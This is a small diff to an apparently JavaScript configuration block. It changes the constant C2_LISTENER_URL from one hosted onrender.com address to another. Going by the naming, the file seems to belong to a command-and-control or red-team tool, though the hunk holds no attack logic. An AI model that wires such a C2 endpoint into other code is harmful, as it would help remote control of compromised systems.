@@ -2,7 +2,7 @@
 // ==================================================================
 // --- CONFIGURATION ---
 // ==================================================================
-const C2_LISTENER_URL = "https://uglyducky-c2-listener.onrender.com"; 
+const C2_LISTENER_URL = "https://uglyducky-c2.onrender.com"; 
 // ==================================================================
 
 // --- GLOBAL STATE ---
